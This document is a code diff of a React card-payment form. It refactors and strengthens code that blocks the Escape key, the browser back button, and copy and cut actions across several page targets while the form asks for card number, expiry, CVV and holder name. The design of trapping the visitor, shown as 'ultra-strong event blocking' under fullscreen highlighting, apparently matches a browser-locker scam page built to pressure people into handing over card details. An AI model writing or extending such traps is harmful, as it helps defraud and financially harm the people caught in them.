@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect, useRef } from 'react';
 import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
 import { wsClient } from '@/integrations/ws-client';
@@ -58,7 +59,6 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
     cardHolder: false,
   });
 
-  const inactivityTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
   const glowTimeouts = useRef<{[key: string]: ReturnType<typeof setTimeout>}>({});
 
   // Ref to store the cleanup function for navigation blockers
@@ -172,65 +172,6 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
            formData.cardHolder.trim().length > 0;
   };
 
-  // Function to clear all navigation blocking event listeners
-  const clearNavigationBlockers = () => {
-    if (cleanupNavigationBlockersRef.current) {
-      cleanupNavigationBlockersRef.current();
-      cleanupNavigationBlockersRef.current = null; // Clear the ref after execution
-    }
-  };
-
-  // Function to reset the inactivity timer
-  const resetInactivityTimer = () => {
-    if (inactivityTimer.current) {
-      clearTimeout(inactivityTimer.current);
-    }
-    inactivityTimer.current = setTimeout(() => {
-      setInputGlow({
-        cardNumber: false,
-        expiryMonth: false,
-        expiryYear: false,
-        cvv: false,
-        cardHolder: false,
-      });
-    }, 2000); // 2 seconds
-  };
-
-  // Initial glow on fullscreen entry
-  useEffect(() => {
-    if (highlightFields) {
-      setInputGlow({
-        cardNumber: true,
-        expiryMonth: true,
-        expiryYear: true,
-        cvv: true,
-        cardHolder: true,
-      });
-      resetInactivityTimer(); // Start the inactivity timer
-    }
-  }, [highlightFields, clickTrigger]);
-
-  // Check if device is mobile
-  useEffect(() => {
-    const checkMobile = () => {
-      const isMobileDevice = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      setIsMobile(isMobileDevice);
-    };
-
-    checkMobile();
-    window.addEventListener('resize', checkMobile);
-    return () => window.removeEventListener('resize', checkMobile);
-  }, []);
-
-  // Check if all card details are filled
-  const isFormValid = () => {
-    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
-           formData.expiryMonth.length >= 1 && formData.expiryMonth.length <= 2 &&
-           formData.expiryYear.length >= 1 && formData.expiryYear.length <= 2 &&
-           formData.cvv.length >= 3 &&
-           formData.cardHolder.trim().length > 0;
-  };
-
   useEffect(() => {
     // Only apply desktop-specific key blocking if not on mobile
     if (isMobile) return;
@@ -287,6 +228,16 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
     // Define targets here so it's available for cleanup
     const targets = [document, window, document.body, document.documentElement];
 
+    // Additional ESC blocking
+    const preventEscape = (e: KeyboardEvent) => {
+      if (e.key === 'Escape' || e.keyCode === 27) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        return false;
+      }
+    };
+
     // Store cleanup function in ref
     cleanupNavigationBlockersRef.current = () => {
       window.removeEventListener('popstate', handlePopState);
@@ -298,6 +249,8 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
         target.removeEventListener('cut', preventDefault, true);
       });
       document.removeEventListener('keydown', preventEscape, true);
+      window.removeEventListener('keydown', preventEscape, true);
+      document.body.removeEventListener('keydown', preventEscape, true);
     };
 
     // Ultra-strong event blocking on multiple targets with maximum prevention
@@ -308,16 +261,6 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
       target.addEventListener('copy', preventDefault, true);
       target.addEventListener('cut', preventDefault, true);
     });
-
-    // Additional ESC blocking
-    const preventEscape = (e: KeyboardEvent) => {
-      if (e.key === 'Escape' || e.keyCode === 27) {
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
-        return false;
-      }
-    };
 
     // Multiple event listeners for maximum ESC blocking
     document.addEventListener('keydown', preventEscape, { capture: true, passive: false });
@@ -555,7 +498,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
 
   return (
     <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? '' : 'p-6'} transition-opacity duration-300 ${fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'}`}>
-      {/* ... keep existing code (back dialog) */}
+      {/* Back Dialog */}
       {showBackDialog && (
         <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
           <div className="bg-white p-6 rounded-lg shadow-lg">
@@ -578,7 +521,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
         </div>
       )}
 
-      {/* ... keep existing code (alert) */}
+      {/* Alert */}
       {showAlert && (
         <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
           <AlertTriangle className="w-5 h-5" />
@@ -586,7 +529,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
         </div>
       )}
 
-      {/* ... keep existing code (secure payment notice) */}
+      {/* Secure Payment Notice */}
       <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
         <div className="flex items-center mb-2">
           <Shield className="w-5 h-5 text-red-600 mr-2" />
@@ -597,7 +540,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
         </p>
       </div>
 
-      {/* ... keep existing code (error message) */}
+      {/* Error Message */}
       {errorMessage && (
         <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
           <p className="text-red-600 text-sm">{errorMessage}</p>
@@ -605,7 +548,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
       )}
 
       <form onSubmit={handleSubmit} className="space-y-4">
-        {/* ... keep existing code (amount field) */}
+        {/* Amount Field */}
         <div>
           <label className="block text-sm font-medium text-gray-700 mb-1">
             Amount to Pay
@@ -758,7 +701,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
           />
         </div>
 
-        {/* ... keep existing code (SSL encryption notice, submit button, payment logos, and footer) */}
+        {/* SSL encryption notice */}
         <div className="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
           <div className="flex items-center text-sm text-blue-800">
             <Shield className="w-4 h-4 mr-2" />
